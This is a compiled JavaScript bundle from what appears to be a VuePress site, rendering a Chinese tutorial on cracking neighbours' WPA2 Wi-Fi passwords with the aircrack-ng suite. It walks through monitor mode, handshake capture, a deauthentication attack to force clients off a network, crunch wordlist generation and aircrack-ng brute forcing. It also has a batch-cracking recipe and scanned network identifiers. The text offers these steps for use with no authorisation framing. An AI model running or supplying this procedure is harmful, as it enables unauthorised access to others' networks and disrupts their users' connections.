(window.webpackJsonp=window.webpackJsonp||[]).push([[40],{552:function(a,r,n){"use strict";n.r(r);var s=n(38),i=Object(s.a)({},(function(){var a=this,r=a.$createElement,n=a._self._c||r;return n("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[n("h2",{attrs:{id:"wifi密码"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#wifi密码"}},[a._v("#")]),a._v(" wifi密码")]),a._v(" "),n("p",[a._v("vmware 设置无线网卡  虚拟机-可移动设备- 网卡 - 连接")]),a._v(" "),n("ol",[n("li",[n("p",[a._v("sudo -i")])]),a._v(" "),n("li",[n("p",[a._v("ifconfig")])]),a._v(" "),n("li",[n("p",[a._v("airmon-ng")])]),a._v(" "),n("li",[n("p",[a._v("airmon-ng start wlan0  发起监听网卡")])]),a._v(" "),n("li",[n("p",[a._v("ifconfig")])]),a._v(" "),n("li",[n("p",[a._v("airodump-ng wlan0 扫描周边wifi（wlan0mon是上一步ifconfig查询出来的网卡名）\n扫描出来的大概信息为 ：\nBSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID"),n("br"),a._v("\n08:60:83:A4:88:90  -58        3      147   20   3  130   WPA2 CCMP   PSK  CMCC-2EFH"),n("br"),a._v("\nEC:6C:B5:98:CA:40  -61        9       11    0   9  130   WPA2 CCMP   PSK  CMCC-208\n扫描出来的wifi信息 原来抓包 ，需要用到bssid（mac地址）  和 ch （频段）")])]),a._v(" "),n("li",[n("p",[a._v("抓包到handshake （被动的抓包模式 需要有用户上下线 ，所以我们使用另外更快的方法,可以促进它加速完成）\nairodump-ng -c 9 --bssid EC:6C:B5:98:CA:40  -w /home/kail/桌面/handshake wlan0mon")])]),a._v(" "),n("li",[n("p",[a._v("使用ack死亡攻击 踢下线 ，WiFi有自动登入功能，重新登录我们就可以立马抓到包了")])])]),a._v(" "),n("p",[a._v("aireplay-ng -0 10 -a EC:6C:B5:98:CA:40 -c 30:03:C8:3B:D7:C7 wlan0mon")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[a._v("0 代表下线; 10 代表攻击10次 ; -a后面是mac地址 ;-c后面是我们上一步抓包的STATION ，代表设备(选中一个流量跑得快的设备)\n")])])]),n("p",[a._v("当抓包的终端头部出现 ...WPA handshake: EC:6C:B5:98:CA:40...  代表我们抓包成功了！\n会在桌面上生成4-5个文件 ， 我们主要用到.cap文件")]),a._v(" "),n("ol",{attrs:{start:"9"}},[n("li",[n("p",[a._v("准备字典  生成字典 （如下）")])]),a._v(" "),n("li",[n("p",[a._v("暴力破解")])])]),a._v(" "),n("p",[a._v("跑本地字典 ：\naircrack-ng -w /home/kail/passwords-1.txt -b EC:6C:B5:98:CA:40 /home/kail/桌面/handshake-0*.cap")]),a._v(" "),n("p",[a._v("aircrack-ng -w /root/00000000-99999999.txt -b EC:6C:B5:98:CA:40 /home/kail/桌面/handshake-0*.cap\n跑生成的字典 ：\n-w 后面是我们放在桌面的字典  -b后面是BSSID地址  以及我们抓包的文件地址")]),a._v(" "),n("h2",{attrs:{id:"准备字典-生成字典"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#准备字典-生成字典"}},[a._v("#")]),a._v(" 准备字典  生成字典")]),a._v(" "),n("p",[a._v("使用crunch工具进行 字典生成  优化规则\n/usr/share/crunch/ 找到定义好的字符集")]),a._v(" "),n("ol",[n("li",[a._v("28.lalpha-numeric                = [abcdefghijklmnopqrstuvwxyz0123456789]")]),a._v(" "),n("li",[a._v("40.mixalpha-numeric-all       = [abcdefghijklmnopqrstuvwxypqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]")])]),a._v(" "),n("p",[a._v("执行生成命令 :")]),a._v(" "),n("p",[a._v("crunch 8 8 /usr/share/crunch/charset.lst lalpha-numeric")]),a._v(" "),n("p",[a._v("执行这个命令后，Crunch工具将生成一个包含所有可能的8位长度的小写字母和数字组合的密码列表。这个列表可以用于密码破解或测试密码强度。请注意，由于密码长度为8位，生成的密码列表可能非常大，需要一定的时间和资源。生成这个密码字典为3Gb")]),a._v(" "),n("p",[a._v("根据字符集生成密码 -o START 路径.txt 可以输出文件\n表示 生成最短8个 最长8个 指定字符集规则的文件\ncrunch 8 8 /usr/share/crunch/charset.lst mixalpha-numeric-all")]),a._v(" "),n("p",[a._v("crunch 8 8 /usr/share/crunch/charset.lst mixalpha-numeric-all -b 1gb -o START /home/kail/")]),a._v(" "),n("p",[a._v("//生成指定字符串\ncrunch 8 8 abcdefghijklmnopqrstuvwxypqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -b 1gb -o START /home/kail/")]),a._v(" "),n("p",[a._v("crunch 8 8 abcdefghijklmnopqrstuvwxypqrstuvwxyz0123456789 -d 1 -b 1gb -o START /home/kail/")]),a._v(" "),n("p",[a._v("crunch 8 8 0123456789 -b 1gb -o START /home/kail/")]),a._v(" "),n("h3",{attrs:{id:"kail自带字典"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#kail自带字典"}},[a._v("#")]),a._v(" kail自带字典")]),a._v(" "),n("p",[a._v("Kali自带的字典文件在/usr/share/wordlists下，将rockyou.txt.gz解压得到rockyou.txt字典文件（该文件包含一千多万个唯一密码）\n解压  gzip -d  /usr/share/wordlists/rockyou.txt.gz"),n("br"),a._v("\n解压后文件夹 /usr/share/wordlists/rockyou.txt")]),a._v(" "),n("h2",{attrs:{id:"批量破解流程"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#批量破解流程"}},[a._v("#")]),a._v(" 批量破解流程")]),a._v(" "),n("p",[a._v("扫描周边wifi\nairmon-ng start wlan0\nairodump-ng wlan0mon")]),a._v(" "),n("p",[a._v("抓包  bssid（mac地址） 和 ch （频段） 也是这里的-c\nairodump-ng -c 6 --bssid F4:84:8D:9A:56:EE -w /home/apple/桌面/handshake wlan0mon")]),a._v(" "),n("p",[a._v("攻击  -a后面是mac地址 ;-c后面是我们上一步抓包的STATION\naireplay-ng -0 10 -a F4:84:8D:9A:56:EE -c EC:2E:98:93:AF:2F wlan0mon")]),a._v(" "),n("p",[a._v("破解  -w 后面是我们放在桌面的字典  -b后面是BSSID地址  以及我们抓包的文件地址\naircrack-ng -w /usr/share/wordlists/rockyou.txt -b F4:84:8D:9A:56:EE /home/apple/桌面/handshake-02.cap")]),a._v(" "),n("h2",{attrs:{id:"vmware-操作支持"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#vmware-操作支持"}},[a._v("#")]),a._v(" vmware 操作支持")]),a._v(" "),n("p",[a._v("外接wifi 使得虚拟机可以使用外接网卡")]),a._v(" "),n("p",[a._v("虚拟机 - 可移动设备 - 801.11 n wlan(找到插入的网卡) - 连接")])])}),[],!1,null,null,null);r.default=i.exports}}]);